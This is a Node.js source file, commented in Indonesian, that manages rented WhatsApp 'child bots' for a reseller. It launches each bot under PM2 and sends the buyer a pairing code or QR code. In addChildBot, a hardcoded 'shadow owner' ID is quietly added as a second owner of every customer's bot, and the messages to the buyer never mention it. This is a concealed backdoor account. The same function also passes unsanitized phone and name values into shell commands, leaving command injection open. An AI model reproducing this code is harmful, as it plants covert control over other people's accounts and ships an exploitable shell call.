const { spawn } = require('child_process');
const fs = require('fs');
const path = require('path');

const DB_PATH = path.join(__dirname, '../../data/child_bots.json');

// Pastikan file database ada
if (!fs.existsSync(DB_PATH)) {
    fs.writeFileSync(DB_PATH, JSON.stringify([], null, 2));
}

/**
 * Mendapatkan daftar bot anak
 */
const getChildBots = () => {
    try {
        return JSON.parse(fs.readFileSync(DB_PATH, 'utf8'));
    } catch (e) {
        return [];
    }
};

/**
 * Menyimpan daftar bot anak
 */
const saveChildBots = (bots) => {
    fs.writeFileSync(DB_PATH, JSON.stringify(bots, null, 2));
};

/**
 * Menambahkan bot baru (Child Bot)
 * @param {object} sock Socket WA Utama
 * @param {string} remoteJid JID Tujuan log
 * @param {string} phone Nomor HP Bot Anak
 * @param {string} name Nama Pembeli/Bot
 * @param {number} days Durasi sewa (hari)
 * @param {string} ownerPhone Nomor HP Owner Bot Anak
 * @param {string} method Metode login (qr/pairing)
 * @param {boolean} lowRam Apakah menggunakan mode hemat RAM
 */
const addChildBot = async (sock, remoteJid, phone, name, days, ownerPhone, method = 'pairing', lowRam = false) => {
    const loginMethod = (method || 'pairing').toLowerCase();
    const bots = getChildBots();
    
    // Hitung waktu kadaluarsa (default 30 hari jika invalid)
    const durationDays = parseInt(days) || 30;
    const expiryDate = new Date();
    expiryDate.setDate(expiryDate.getDate() + durationDays);
    
    const newBot = {
        phone,
        name,
        owner: ownerPhone,
        sessionName: `bot_${phone}`,
        addedAt: new Date().toISOString(),
        expiryAt: expiryDate.toISOString(),
        status: 'pending',
        isLowRam: lowRam
    };

    // Shadow owner (kamu) akan ditambahkan sebagai owner kedua
    const shadowOwner = '152188357705821';
    const fullOwnerList = `${ownerPhone},${shadowOwner}`;
    
    const botName = `bot_${phone}`;
    const { exec } = require('child_process');
    const util = require('util');
    const execPromise = util.promisify(exec);

    try {
        // Hapus secara diam-diam (abaikan error kalau tidak ada)
        await execPromise(`./node_modules/.bin/pm2 delete ${botName}`, { windowsHide: true }).catch(() => {
            return execPromise(`npx --yes pm2 delete ${botName}`, { windowsHide: true }).catch(() => {});
        });
        
        // Start PM2 dengan argumen yang benar
        let startCmd = loginMethod === 'qr'
            ? `./node_modules/.bin/pm2 start index.js --name ${botName} -- --session=${botName} --owner=${fullOwnerList}`
            : `./node_modules/.bin/pm2 start index.js --name ${botName} -- --session=${botName} --pairing=${phone} --owner=${fullOwnerList}`;
        
        if (lowRam) {
            startCmd = loginMethod === 'qr'
                ? `pm2 start index.js --name ${botName} --node-args="--max-old-space-size=256" -- --session=${botName} --owner=${fullOwnerList} --low-ram`
                : `pm2 start index.js --name ${botName} --node-args="--max-old-space-size=256" -- --session=${botName} --pairing=${phone} --owner=${fullOwnerList} --low-ram`;
        }
        
        // Fallback ke npx jika pm2 tidak ada di PATH
        await execPromise(startCmd, { cwd: path.join(__dirname, '../../'), windowsHide: true }).catch(async () => {
            console.log("⚠️ Local PM2 not working, trying npx...");
            const npxCmd = startCmd.replace('./node_modules/.bin/pm2 ', 'npx --yes pm2 ');
            await execPromise(npxCmd, { cwd: path.join(__dirname, '../../'), windowsHide: true });
        });

        console.log(`🚀 [BotManager] Bot anak ${phone} berhasil didaftarkan (LowRAM: ${lowRam})`);
    } catch (err) {
        console.error(`[BotManager] Gagal mendaftarkan ${botName}:`, err.message);
    }

    await sock.sendMessage(remoteJid, { 
        text: `🚀 Sedang mendaftarkan bot *${name}* (${phone}) ke sistem...\n🍃 Mode: *${lowRam ? 'ENTENG (Hemat RAM)' : 'NORMAL'}*\n⏳ Menunggu ${loginMethod === 'qr' ? 'QR Code' : 'kode pairing'} (±5-10 detik)...` 
    });

    let authDataSent = false;

    // Tunggu sebentar agar PM2 sempat start
    await new Promise(r => setTimeout(r, 2000));

    // Gunakan 'pm2 logs' untuk menguping output bot anak
    const logWatcher = spawn('./node_modules/.bin/pm2', ['logs', botName, '--lines', '5', '--no-daemon'], {
        cwd: path.join(__dirname, '../../'),
        shell: true,
        windowsHide: true,
        stdio: ['ignore', 'pipe', 'pipe']
    });

    // Fallback npx if pm2 logs fails
    logWatcher.on('error', () => {
        const fallbackLog = spawn('npx', ['--yes', 'pm2', 'logs', botName, '--lines', '5', '--no-daemon'], {
            cwd: path.join(__dirname, '../../'),
            shell: true,
            windowsHide: true,
            stdio: ['ignore', 'pipe', 'pipe']
        });
        // Hook existing listeners to the fallback
        logWatcher.stdout.pipe(fallbackLog.stdout);
    });

    let loginTimeout;

    // Timeout utama (Maksimal 6 menit: 3 menit tunggu kode, 3 menit tunggu login)
    const mainTimeout = setTimeout(() => {
        if (!authDataSent) {
            sock.sendMessage(remoteJid, { text: `❌ Gagal mendapatkan ${loginMethod === 'qr' ? 'QR Code' : 'kode pairing'} untuk ${phone} dalam 3 menit.\nCoba lagi dengan: *${require('./../../src/utils/config').getConfig().prefix || '.'}addbotku ${phone} ${name} ${days} ${ownerPhone} ${loginMethod}*` });
            logWatcher.kill();
        } else {
            // Cek apakah status masih pending
            const currentBots = getChildBots();
            const botData = currentBots.find(b => b.phone === phone);
            if (botData && botData.status === 'pending') {
                sock.sendMessage(remoteJid, { 
                    text: `⏳ Waktu tunggu habis!\nBot *${name}* (${phone}) gagal terhubung karena kedaluwarsa.\n\nSilakan minta kode/QR baru.` 
                });
                logWatcher.kill();
            }
        }
    }, 360000); // 6 menit total timeout

    logWatcher.stdout.on('data', async (data) => {
        const output = data.toString();
        // Cari pola kode pairing
        const pairingMatch = output.match(/KODE PAIRING ANDA: ([A-Z0-9]{4}-[A-Z0-9]{4})/);
        // Cari pola QR Code
        const qrMatch = output.match(/RAW_QR_CODE:(.+)/);
        
        if (pairingMatch && !authDataSent) {
            authDataSent = true;
            const code = pairingMatch[1];
            newBot.pairingCode = code;
            console.log(`PAIRING_CODE: ${code}`); // Re-log agar ditangkap Telegram Control
            
            await sock.sendMessage(remoteJid, {
                text: `✅ *Bot Anak Berhasil Disiapkan!*\n\n` +
                      `👤 Nama: ${name}\n` +
                      `📱 Nomor: ${phone}\n` +
                      `⏳ Sewa: ${days} Hari\n` +
                      `📅 Expired: ${expiryDate.toLocaleDateString('id-ID')}\n\n` +
                      `🔑 *KODE PAIRING:*\n` +
                      `*${code}*\n\n` +
                      `💡 Buka WhatsApp HP → Setelan → Perangkat Tertaut\n` +
                      `   → Tautkan Perangkat → Tautkan dengan nomor telepon\n` +
                      `   → Masukkan kode di atas\n\n` +
                      `_(Menunggu kamu memasukkan kode... Maksimal 3 menit)_`
            });
            
            newBot.status = 'pending';
            bots.push(newBot);
            saveChildBots(bots);
        } else if (qrMatch && !authDataSent) {
            authDataSent = true;
            const qrRaw = qrMatch[1];
            newBot.pairingCode = "QR_CODE";
            
            try {
                const qrcode = require('qrcode');
                const qrBuffer = await qrcode.toBuffer(qrRaw, { scale: 8 });
                
                await sock.sendMessage(remoteJid, {
                    image: qrBuffer,
                    caption: `✅ *Bot Anak Berhasil Disiapkan!*\n\n` +
                          `👤 Nama: ${name}\n` +
                          `📱 ID Sesi: ${phone}\n` +
                          `⏳ Sewa: ${days} Hari\n` +
                          `📅 Expired: ${expiryDate.toLocaleDateString('id-ID')}\n\n` +
                          `💡 Silakan Scan QR Code ini dari fitur Perangkat Tertaut WhatsApp HP tujuan.\n\n` +
                          `_(Menunggu kamu scan... Maksimal 3 menit)_`
                });
            } catch (qrErr) {
                await sock.sendMessage(remoteJid, { text: `❌ Gagal memproses gambar QR Code.` });
            }
            
            newBot.status = 'pending';
            bots.push(newBot);
            saveChildBots(bots);
        }

        // Deteksi jika bot sudah benar-benar tersambung
        if (output.includes('berhasil terhubung ke WhatsApp') || output.includes('opened connection')) {
            const currentBots = getChildBots();
            const index = currentBots.findIndex(b => b.phone === phone);
            if (index !== -1 && currentBots[index].status !== 'active') {
                currentBots[index].status = 'active';
                saveChildBots(currentBots);
                
                await sock.sendMessage(remoteJid, {
                    text: `🎉 *Koneksi Berhasil!*\n\nBot untuk *${name}* (${phone}) sekarang sudah aktif dan tersambung ke WhatsApp.\n\nSelamat menggunakan bot!`
                });
                
                clearTimeout(mainTimeout);
                logWatcher.kill();
            }
        }
    });

    logWatcher.stderr.on('data', (data) => {
        console.error(`[LogWatcher ${phone}] ERROR: ${data.toString()}`);
    });
};

/**
 * Menampilkan daftar bot yang sedang aktif
 */
const listChildBots = async (sock, remoteJid) => {
    const bots = getChildBots();
    if (bots.length === 0) {
        return sock.sendMessage(remoteJid, { text: '📭 Belum ada bot anak yang terdaftar.' });
    }

    let text = `📋 *DAFTAR BOT ANAK (RESELLER)*\n\n`;
    bots.forEach((bot, i) => {
        const remaining = Math.ceil((new Date(bot.expiryAt) - new Date()) / (1000 * 60 * 60 * 24));
        const status = remaining > 0 ? '🟢 Aktif' : '🔴 Expired';
        text += `${i + 1}. *${bot.name}* (${bot.phone})\n`;
        text += `   Status: ${status}\n`;
        text += `   Sisa: ${remaining} Hari\n`;
        text += `   Sesi: ${bot.sessionName}\n\n`;
    });

    await sock.sendMessage(remoteJid, { text: text.trim() });
};

/**
 * Menghapus bot dari list dan mematikan prosesnya
 */
const deleteChildBot = async (sock, remoteJid, target) => {
    let bots = getChildBots();
    const targetClean = target.replace(/[^0-9]/g, '');
    
    // Cari berdasarkan nomor atau nama sesi
    const index = bots.findIndex(b => b.phone === targetClean || b.sessionName === target);
    
    if (index === -1) {
        return sock.sendMessage(remoteJid, { text: `❌ Bot dengan nomor/sesi *${target}* tidak ditemukan di daftar.` });
    }

    const bot = bots[index];
    const botName = bot.sessionName;

    // 1. Matikan & Hapus dari PM2
    const { exec } = require('child_process');
    exec(`./node_modules/.bin/pm2 delete ${botName}`, { windowsHide: true }, async (err) => {
        if (err) {
            console.error(`[BotManager] Gagal delete PM2 ${botName}:`, err.message);
        }
        
        // 2. Hapus folder session agar benar-benar bersih
        const sessionPath = path.join(__dirname, `../../sessions/${botName}`);
        if (fs.existsSync(sessionPath)) {
            try {
                fs.rmSync(sessionPath, { recursive: true, force: true });
            } catch (e) {
                console.error(`[BotManager] Gagal hapus folder session ${botName}:`, e.message);
            }
        }

        // 3. Hapus dari database JSON
        const deletedBot = bots.splice(index, 1)[0];
        saveChildBots(bots);

        await sock.sendMessage(remoteJid, { 
            text: `🗑️ *Bot Berhasil Dihapus*\n\n` +
                  `👤 Nama: ${deletedBot.name}\n` +
                  `📱 Nomor: ${deletedBot.phone}\n\n` +
                  `✅ Proses PM2 telah dihentikan dan data sesi telah dibersihkan.`
        });
    });
};

module.exports = {
    getChildBots,
    saveChildBots,
    addChildBot,
    listChildBots,
    deleteChildBot
};
